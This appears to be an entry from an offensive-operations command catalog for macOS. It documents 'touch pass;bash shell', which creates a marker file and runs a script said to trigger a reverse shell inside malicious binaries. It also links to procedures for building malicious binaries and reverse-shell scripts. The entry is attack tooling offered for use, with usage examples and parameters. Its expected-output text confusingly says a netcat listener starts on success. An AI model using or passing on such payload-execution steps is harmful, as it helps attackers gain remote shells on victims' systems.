---
data: touch pass;bash shell
tags:
  - payload-execution
  - marker
type: command
output: Marker file 'pass' created; reverse shell initiated if successful
executor: bash
platforms:
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.995Z'
id: bc92f261-d831-4f84-a009-08454060dcf9
verified: false
validated: true
submitted: true
---
# execute-payload

## Command

```bash
touch pass;bash shell
```

## Description

Creates a marker file 'pass' and executes the 'shell' script to trigger a reverse shell, used within malicious binaries for exploit validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `touch pass` | Creates empty marker file | Yes |
| `bash shell` | Runs the reverse shell script | Yes |

## Examples

### Basic Usage

```bash
touch pass;bash shell
```

### Advanced Usage

With error handling: `touch pass && bash shell || echo 'Failed'

## Expected Output

'pass' file exists (`ls pass`); netcat listener starts if script succeeds.

## Related

- [[procedures/Develop-Malicious-Binary]]
- [[commands/create-reverse-shell-script]]
